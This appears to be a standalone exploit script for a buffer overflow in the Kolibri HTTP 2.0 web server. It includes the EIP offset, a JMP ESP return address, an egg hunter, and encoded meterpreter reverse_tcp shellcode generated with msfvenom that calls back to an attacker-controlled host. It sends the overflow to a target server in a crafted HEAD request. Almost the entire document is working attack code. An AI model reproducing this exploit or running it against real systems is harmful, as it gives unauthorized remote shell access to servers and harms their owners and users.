#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the Buffer Overflow vulnerability in Kolibri HTTP 2.0. Though it's an old vulnerability and many exploits exist for it, I created this from scratch using the egg hunter technique.

#EIP offset 515
#JMP ESP = 0x7E455AF7   0x7e455af7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
#Short Jump = -60 bytes opcode: \xEB\xC4
#Command to generate egg hunter !mona egg -t ycsc (\x79\x63\x73\x63)
#Egg Hunter: "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x79\x63\x73\x63\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#badchars: \x00\x0A\x0D\x20\x3F
#payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00\x0A\x0D\x20\x3F' -f python

import sys
import socket

hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x79\x63\x73\x63\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"




evil = "\x90"*478+ hunter + "\x90"*5 + "\xF7\x5A\x45\x7E" + "\xEB\xC4"
tag = "ycscycsc"
buf =  ""
buf += "\xbb\xca\x83\x9e\xfe\xdd\xc3\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x56\x83\xc6\x04\x31\x5e\x0f\x03\x5e\xc5\x61"
buf += "\x6b\x02\x31\xe7\x94\xfb\xc1\x88\x1d\x1e\xf0\x88\x7a"
buf += "\x6a\xa2\x38\x08\x3e\x4e\xb2\x5c\xab\xc5\xb6\x48\xdc"
buf += "\x6e\x7c\xaf\xd3\x6f\x2d\x93\x72\xf3\x2c\xc0\x54\xca"
buf += "\xfe\x15\x94\x0b\xe2\xd4\xc4\xc4\x68\x4a\xf9\x61\x24"
buf += "\x57\x72\x39\xa8\xdf\x67\x89\xcb\xce\x39\x82\x95\xd0"
buf += "\xb8\x47\xae\x58\xa3\x84\x8b\x13\x58\x7e\x67\xa2\x88"
buf += "\x4f\x88\x09\xf5\x60\x7b\x53\x31\x46\x64\x26\x4b\xb5"
buf += "\x19\x31\x88\xc4\xc5\xb4\x0b\x6e\x8d\x6f\xf0\x8f\x42"
buf += "\xe9\x73\x83\x2f\x7d\xdb\x87\xae\x52\x57\xb3\x3b\x55"
buf += "\xb8\x32\x7f\x72\x1c\x1f\xdb\x1b\x05\xc5\x8a\x24\x55"
buf += "\xa6\x73\x81\x1d\x4a\x67\xb8\x7f\x02\x44\xf1\x7f\xd2"
buf += "\xc2\x82\x0c\xe0\x4d\x39\x9b\x48\x05\xe7\x5c\xd9\x01"
buf += "\x18\xb2\x61\x41\xe6\x33\x91\x4b\x2d\x67\xc1\xe3\x84"
buf += "\x08\x8a\xf3\x29\xdd\x26\xfe\xbd\x1e\x1e\xd5\x21\xf7"
buf += "\x5c\x2a\x4b\x5b\xe9\xcc\x3b\x33\xb9\x40\xfc\xe3\x79"
buf += "\x31\x94\xe9\x76\x6e\x84\x11\x5d\x07\x2f\xfe\x0b\x7f"
buf += "\xd8\x67\x16\x0b\x79\x67\x8d\x71\xb9\xe3\x27\x85\x74"
buf += "\x04\x42\x95\x61\x73\xac\x65\x72\x16\xac\x0f\x76\xb0"
buf += "\xfb\xa7\x74\xe5\xcb\x67\x86\xc0\x48\x6f\x78\x95\x78"
buf += "\x1b\x4f\x03\xc4\x73\xb0\xc3\xc4\x83\xe6\x89\xc4\xeb"
buf += "\x5e\xea\x97\x0e\xa1\x27\x84\x82\x34\xc8\xfc\x77\x9e"
buf += "\xa0\x02\xa1\xe8\x6e\xfd\x84\x6a\x68\x01\x5a\x45\xd1"
buf += "\x69\xa4\xd5\xe1\x69\xce\xd5\xb1\x01\x05\xf9\x3e\xe1"
buf += "\xe6\xd0\x16\x69\x6c\xb5\xd5\x08\x71\x9c\xb8\x94\x72"
buf += "\x13\x61\x27\x08\x5c\x96\xc8\xed\x74\xf3\xc9\xed\x78"
buf += "\x05\xf6\x3b\x41\x73\x39\xf8\xf6\x8c\x0c\x5d\x5e\x07"
buf += "\x6e\xf1\xa0\x02"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.43.72',8080))
s.send("HEAD /"+evil+" HTTP/1.1\r\n" +
	  "Host: 192.168.43.72:8080\r\n" +
	  "User-Agent: " + tag + buf +"\r\n" + 
	  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
	  "Accept-Language: en-US,en;q=0.5\r\n"+
	  "Accept-Encoding: gzip, deflate\r\n"+
	  "Connection: keep-alive\r\n"+
	  "Upgrade-Insecure-Requests: 1\r\n\r\n")
s.close()
